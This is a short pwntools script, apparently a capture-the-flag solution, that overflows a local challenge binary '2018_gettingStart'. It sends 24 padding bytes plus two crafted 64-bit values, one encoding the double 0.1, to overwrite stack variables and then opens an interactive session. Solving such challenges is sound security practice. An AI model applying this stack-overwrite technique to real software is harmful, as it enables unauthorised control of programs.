from pwn import*
elf=ELF('./2018_gettingStart')
p=process('./2018_gettingStart')

payload=b'a'*24+p64(0x7fffffffffffffff)+p64(0x3FB999999999999A)

p.sendline(payload)
p.interactive()